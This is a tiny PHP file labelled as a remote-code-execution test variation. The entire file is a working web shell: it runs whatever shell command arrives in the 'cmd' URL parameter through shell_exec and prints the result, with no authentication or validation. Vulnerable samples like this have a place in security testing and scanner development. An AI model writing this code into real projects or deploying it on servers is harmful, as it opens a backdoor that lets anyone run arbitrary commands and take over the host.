<?php
// RCE test variation #1410
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>